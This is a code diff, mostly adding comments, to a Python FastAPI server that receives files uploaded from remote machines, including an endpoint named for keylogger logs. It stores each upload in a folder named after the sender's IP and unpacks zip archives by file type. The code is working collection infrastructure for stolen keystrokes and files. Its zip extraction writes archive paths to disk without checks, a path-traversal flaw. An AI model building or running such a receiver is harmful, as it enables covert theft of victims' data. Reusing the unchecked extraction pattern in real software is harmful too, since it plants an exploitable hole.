@@ -1,11 +1,11 @@
-import uvicorn
-import os
-import mimetypes
-from zipfile import ZipFile
-from fastapi import FastAPI, Request, UploadFile, File
-from typing import List
+import uvicorn # to launch the server
+import os # anything related to folders and files
+import mimetypes # to get mimetypes
+from zipfile import ZipFile # to deal with zip files
+from fastapi import FastAPI, Request, UploadFile, File # to make the server work
+from typing import List # to make file receiving work
 
-app = FastAPI()
+app = FastAPI() # make the server
 
 @app.post("/")
 async def get_files(request: Request, files: List[UploadFile] = File(...)): # to recieve any amount of files of any type
@@ -28,20 +28,20 @@ async def get_keylogger_log(request: Request, file: UploadFile = File(...)): # t
         f.write(contents)
 
 @app.post("/zip")
-async def handle_zip(request: Request, file: UploadFile = File(...)):
+async def handle_zip(request: Request, file: UploadFile = File(...)): # to recieve zip files you want to unpack
     IP = request.client.host  # get IP
     os.makedirs(IP, exist_ok=True)  # make a directory for the IP that sent the file for organization
-    zip_name = f"{IP}/{file.filename}"
+    zip_name = f"{IP}/{file.filename}" # make the zip name so its placed in a folder of the IP that sent it
     with open(zip_name, "wb") as zip:
-        zip.write(await file.read())
+        zip.write(await file.read()) # make the zip file that was received
     with ZipFile(zip_name, 'r') as zip:
-        files = zip.namelist()
+        files = zip.namelist() # get the list of files in the zip
         for file in files:
-            file_type = mimetypes.guess_type(file)[0].replace('/', '-')
+            file_type = mimetypes.guess_type(file)[0].replace('/', '-') # get the file type for the file
             os.makedirs(f"{IP}/{file_type}", exist_ok=True)  # make a directory for the file type for organization
             with open(f"{IP}/{file_type}/{file}", 'wb') as f:
-                f.write(zip.read(file))
-    os.remove(zip_name)
+                f.write(zip.read(file)) # put the contents of the file in the zip into the file you're making outside of the zip
+    os.remove(zip_name) # remove the zip file you went through to avoid clutter
 
 if __name__ == "__main__":
     uvicorn.run(app, host="0.0.0.0", port=8000)
